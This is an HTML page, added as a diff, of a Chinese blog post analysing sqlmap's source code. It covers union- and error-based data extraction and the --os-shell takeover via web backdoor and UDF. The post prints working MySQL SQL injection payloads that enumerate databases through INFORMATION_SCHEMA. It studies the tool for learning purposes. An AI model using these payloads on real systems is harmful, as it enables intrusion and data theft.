@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="sqlmap源码分析下 联合查询补充一个点 以及sqlmap --os-shell -d api参数等分析">
+<meta name="keywords" content="源码 读书 安全 开发 Python Java Go">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap源码分析下">
+<meta property="og:url" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/index.html">
+<meta property="og:site_name" content="Recar的笔记">
+<meta property="og:description" content="sqlmap源码分析下 联合查询补充一个点 以及sqlmap --os-shell -d api参数等分析">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/queries.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9A%E4%B9%89%E7%9A%84%E5%87%BD%E6%95%B0.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/mysql_xml.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/mysql_dbms.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8B%5C2019-12-06-18-49-35-image.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8B%5Cimage-20191206192333003.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/error_get_dbs.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E7%AE%80%E5%8D%95%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E9%80%89%E6%8B%A9web%E8%AF%AD%E8%A8%80.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E8%8E%B7%E5%8F%96%E5%AE%8C%E6%95%B4web%E7%9B%AE%E5%BD%95.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/all_shell.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/os-shell%E6%88%AA%E5%9B%BE.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E7%A1%AE%E8%AE%A4mysql.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E5%AF%B9%E5%BA%94%E5%87%BD%E6%95%B0.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/os%E4%B8%8Edbs%E5%88%A4%E6%96%AD.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E9%80%89%E6%8B%A964%E4%BD%8D%E8%BF%98%E6%98%AF32%E4%BD%8D.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E5%BC%82%E6%88%96%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/mysql_udf_%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%9A%84udf%E6%96%87%E4%BB%B6.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E6%88%90%E5%8A%9F%E5%90%8Emysql%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/sqlmap%E4%BA%A4%E4%BA%92shell.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/sqlapi%E8%BF%90%E8%A1%8C.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/api%E5%88%9B%E5%BB%BA%E4%BB%BB%E5%8A%A1.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E6%89%AB%E6%8F%8F%E7%8A%B6%E6%80%81.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/%E6%B3%A8%E5%85%A5%E7%BB%93%E6%9E%9C.jpg">
+<meta property="og:updated_time" content="2021-06-11T10:33:06.337Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqlmap源码分析下">
+<meta name="twitter:description" content="sqlmap源码分析下 联合查询补充一个点 以及sqlmap --os-shell -d api参数等分析">
+<meta name="twitter:image" content="http://yoursite.com/2021/06/11/sqlmap源码分析下/queries.jpg">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2021/06/11/sqlmap源码分析下/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>sqlmap源码分析下 | Recar的笔记</title>
+  
+
+
+
+
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?f6Wf4b00fa957d7290583a86b0d8c2de1";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Recar的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/Ciyfly" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/06/11/sqlmap源码分析下/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Recar">
+      <meta itemprop="description" content="年轻人就应该多读源码多读书">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Recar的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqlmap源码分析下
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-06-11 10:33:06" itemprop="dateCreated datePublished" datetime="2021-06-11T10:33:06+00:00">2021-06-11</time>
+            </span>
+          
+
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+            <div class="post-description">sqlmap源码分析下 联合查询补充一个点 以及sqlmap --os-shell -d api参数等分析</div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sqlmap源码分析下"><a href="#sqlmap源码分析下" class="headerlink" title="sqlmap源码分析下"></a>sqlmap源码分析下</h1><p>Author: recar<br>E-mail: <a href="mailto:1766241489@qq.com" target="_blank" rel="noopener">1766241489@qq.com</a></p>
+<p>补充联合查询一个点<br>以及sqlmap –os-shell -d api参数等分析  </p>
+<h2 id="补充联合查询一个点"><a href="#补充联合查询一个点" class="headerlink" title="补充联合查询一个点"></a>补充联合查询一个点</h2><p>上次因为提取了一个正则 但是那个网站把url返回到页面上了 所以匹配上误报了<br>于是要确定中间匹配的内容的正则 验证注入这里是随机的字母字符串 但是只是验证<br>获取数据还是根据返回的数据<br>匹配数据的 <code>qxxxq(?P&lt;result&gt;.*?)qxxxq</code><br>中间是这样写的正则  </p>
+<p>下面是联合查询的一些详细的地方  </p>
+<p>先获取有几个字段  <code>1&#39; ORDER BY 10-- yPij</code> 二分判断</p>
+<p>然后会去判断 每个字段最大输出的长度是40 还是10  </p>
+<p>UNION_MIN_RESPONSE_CHARS 10</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> charCount <span class="keyword">in</span> (UNION_MIN_RESPONSE_CHARS &lt;&lt; <span class="number">2</span>, UNION_MIN_RESPONSE_CHARS):</span><br><span class="line">    <span class="comment"># 第一次是 40 第二次是10 </span></span><br><span class="line">    <span class="comment"># 每次都会将每个字段都测试一下 去匹配是否能匹配上这个特征字符串 每次都会重新随机中间的字符串</span></span><br><span class="line">    <span class="keyword">if</span> vector:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> positions:</span><br><span class="line">        randQuery = randomStr(charCount)</span><br><span class="line">        phrase = (<span class="string">"%s%s%s"</span> % (kb.chars.start, randQuery, kb.chars.stop)).lower()</span><br><span class="line">        randQueryProcessed = agent.concatQuery(<span class="string">"\'%s\'"</span> % randQuery)</span><br><span class="line">        randQueryUnescaped = unescaper.escape(randQueryProcessed)</span><br></pre></td></tr></table></figure>
+
+<h3 id="验证成功后获取数据"><a href="#验证成功后获取数据" class="headerlink" title="验证成功后获取数据"></a>验证成功后获取数据</h3><p>上次分析了注入点的验证确认 这里我们继续讲下 如何获取想要的数据<br>我们这里测试获取数据库名 使用参数 <code>--dbs</code>  </p>
+<p>断点会跟入这个与数据库相关的函数 <code>action()</code>  </p>
+<p>进入函数里面可以看到如下根据参数判断是获取指定数据<br>如 当前用户 当前数据库 是否dba等  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enumeration options</span></span><br><span class="line"><span class="keyword">if</span> conf.getBanner:</span><br><span class="line">    conf.dumper.banner(conf.dbmsHandler.getBanner())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> conf.getCurrentUser:</span><br><span class="line">    conf.dumper.currentUser(conf.dbmsHandler.getCurrentUser())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> conf.getCurrentDb:</span><br><span class="line">    conf.dumper.currentDb(conf.dbmsHandler.getCurrentDb())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> conf.getHostname:</span><br><span class="line">    conf.dumper.hostname(conf.dbmsHandler.getHostname())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> conf.isDba:</span><br><span class="line">    conf.dumper.dba(conf.dbmsHandler.isDba())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> conf.getUsers:</span><br><span class="line">    conf.dumper.users(conf.dbmsHandler.getUsers())</span><br></pre></td></tr></table></figure>
+
+<p>因为我们指定了参数 <code>--dbs</code>  </p>
+<p>所以进入<code>getDbs</code>这个函数<br>路径如下:<br><code>plugins/generic/databases.py:81</code>  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.getDbs:</span><br><span class="line">    conf.dumper.dbs(conf.dbmsHandler.getDbs())</span><br></pre></td></tr></table></figure>
+
+<p>然后根据数据库选择判断选择封装对象<br><code>rootQuery = queries[Backend.getIdentifiedDbms()].dbs</code>  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/queries.jpg" alt="queries"><br>可以看到是 获取之前判断的数据库类型然后再选定对应的数据库  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9A%E4%B9%89%E7%9A%84%E5%87%BD%E6%95%B0.jpg" alt="数据库定义的函数"><br>针对获取不同的数据选择不同的sql  </p>
+<p>这些都是 <code>sqlmap/xml/queries.xml</code> 下的  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/mysql_xml.jpg" alt="mysql_xml">  </p>
+<p>因为是获取数据库<br><img src="/2021/06/11/sqlmap源码分析下/mysql_dbms.jpg" alt="mysql_dbms">  </p>
+<p>如下是选择使用哪个sql语句  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> Backend.isDbms(DBMS.MYSQL) <span class="keyword">and</span> <span class="keyword">not</span> kb.data.has_information_schema:</span><br><span class="line">                query = rootQuery.inband.query2</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                query = rootQuery.inband.query</span><br><span class="line"></span><br><span class="line">values = inject.getValue(query, blind=<span class="literal">False</span>, time=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 即有union优先使用 然后才是报错这里走的布尔和时间都false了不然还是会用</span></span><br></pre></td></tr></table></figure>
+
+<p>上面即是<br>如果有 information_schema 那么就是<br><code>SELECT DISTINCT(db) FROM mysql.db LIMIT %d,1</code><br>否则<br><code>SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1</code></p>
+<p>Mysql 5 以上有内置库 information_schema<br>所以可以看到版本根据版本来判断<br>是这样判断是否是否版本5以上的  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> Backend.isVersionGreaterOrEqualThan(<span class="string">"5"</span>):</span><br><span class="line">    kb.data.has_information_schema = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>先使用的联合查询 统计下字段名 但是没有返回信息<br>可以看下下面的log日志和手动url的页面返回内容   </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[18:42:28] [PAYLOAD] -8751' UNION ALL SELECT NULL,NULL,CONCAT(0x717a717a71,IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x71786a6a71) FROM INFORMATION_SCHEMA.SCHEMATA-- gKIC</span><br><span class="line">[18:42:49] [WARNING] the SQL query provided does not return any output</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/11/sqlmap源码分析下/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8B%5C2019-12-06-18-49-35-image.png" alt></p>
+<p>union联合查询没有成功那么这里就走到了报错获取  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = errorUse(forgeCaseExpression <span class="keyword">if</span> expected == EXPECTED.BOOL <span class="keyword">else</span> query, dump)</span><br></pre></td></tr></table></figure>
+
+<p>如果union可以 那么就是调用下面的方法  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = _goUnion(forgeCaseExpression <span class="keyword">if</span> expected == EXPECTED.BOOL <span class="keyword">else</span> query, unpack, dump)</span><br></pre></td></tr></table></figure>
+
+<p>在利用报错读取数据之前，sqlmap需要searching for error chunk length，这length是干嘛用的呢？</p>
+<p>简单的说，就是报错返回的内容不可能是很长很长的，肯定有长度限制</p>
+<p>这里可以看到二分的判断长度<br><img src="/2021/06/11/sqlmap源码分析下/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8B%5Cimage-20191206192333003.png" alt="image-20191206192333003"></p>
+<p>然后获取有多少个数据库  </p>
+<p><code>1&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627871,(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x7162786a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#39;Pgzy&#39;=&#39;Pgzy</code>  </p>
+<p>COUNT 函数统计<br>然后 获取数据库名  </p>
+<p><code>1&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627871,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,451) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7162786a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#39;FhJw&#39;=&#39;FhJw</code>  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/error_get_dbs.jpg" alt="error_get_dbs">  </p>
+<p>最后获取数据库  </p>
+<p>剩下的获取详细字段等都是类似的  </p>
+<p>简单流程图如下:  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E7%AE%80%E5%8D%95%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="简单获取数据流程图">  </p>
+<p>数据的获取就是如上  </p>
+<h2 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h2><p>我们这里看下 获取shell的这块<br>主要是这两个命令 <code>–os-cmd,–os-shell</code><br>执行命令输入如下    </p>
+<p>先选择web语言<br><img src="/2021/06/11/sqlmap源码分析下/%E9%80%89%E6%8B%A9web%E8%AF%AD%E8%A8%80.jpg" alt="选择web语言">  </p>
+<p>选择是否尝试获取完整目录  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E8%8E%B7%E5%8F%96%E5%AE%8C%E6%95%B4web%E7%9B%AE%E5%BD%95.jpg" alt="获取完整web目录">  </p>
+<p>具体函数 (<code>plugins/generic/takeover.py:67</code>) </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">osShell</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isStackingAvailable() <span class="keyword">or</span> conf.direct:</span><br><span class="line">        web = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> isStackingAvailable() <span class="keyword">and</span> Backend.isDbms(DBMS.MYSQL):</span><br><span class="line">        infoMsg = <span class="string">"going to use a web backdoor for command prompt"</span></span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">        web = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        errMsg = <span class="string">"unable to prompt for an interactive operating "</span></span><br><span class="line">        errMsg += <span class="string">"system shell via the back-end DBMS because "</span></span><br><span class="line">        errMsg += <span class="string">"stacked queries SQL injection is not supported"</span></span><br><span class="line">        <span class="keyword">raise</span> SqlmapNotVulnerableException(errMsg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个根据系统判断的临时文件路径赋值到 conf.tmpPath</span></span><br><span class="line">    self.getRemoteTempPath()</span><br><span class="line">    <span class="comment"># 主要函数 下面跟入</span></span><br><span class="line">    self.initEnv(web=web)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> web <span class="keyword">or</span> (web <span class="keyword">and</span> self.webBackdoorUrl <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">        <span class="comment"># 这个就是最后的交互shell 无论是有成功都会执行  </span></span><br><span class="line">        self.shell()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> conf.osPwn <span class="keyword">and</span> <span class="keyword">not</span> conf.cleanup:</span><br><span class="line">        <span class="comment"># 清除会话 比如是否删除 创建的 sys_exec sys_eval函数</span></span><br><span class="line">        self.cleanup(web=web)</span><br></pre></td></tr></table></figure>
+
+<h4 id="initENV"><a href="#initENV" class="headerlink" title="initENV"></a>initENV</h4><p><code>lib/takeover/abstraction.py:178</code>  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initEnv</span><span class="params">(self, mandatory=True, detailed=False, web=False, forceInit=False)</span>:</span></span><br><span class="line">    self._initRunAs()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.envInitialized <span class="keyword">and</span> <span class="keyword">not</span> forceInit:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> web:</span><br><span class="line">        <span class="comment"># 这里就是初始化需要上次的临时文件名 上传的目录</span></span><br><span class="line">        self.webInit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 检验获取系统</span></span><br><span class="line">        self.checkDbmsOs(detailed)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Backend.getIdentifiedDbms() <span class="keyword">in</span> (DBMS.MYSQL, DBMS.PGSQL):</span><br><span class="line">            <span class="comment"># 这里是udf文件提权</span></span><br><span class="line">            success = self.udfInjectSys()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> success <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">True</span>:</span><br><span class="line">                msg = <span class="string">"unable to mount the operating system takeover"</span></span><br><span class="line">                <span class="keyword">raise</span> SqlmapFilePathException(msg)</span><br><span class="line">        <span class="keyword">elif</span> Backend.isDbms(DBMS.MSSQL):</span><br><span class="line">            <span class="keyword">if</span> mandatory:</span><br><span class="line">                self.xpCmdshellInit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            errMsg = <span class="string">"feature not yet implemented for the back-end DBMS"</span></span><br><span class="line">            <span class="keyword">raise</span> SqlmapUnsupportedFeatureException(errMsg)</span><br><span class="line"></span><br><span class="line">    self.envInitialized = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>主要是 <code>webInit</code>  </p>
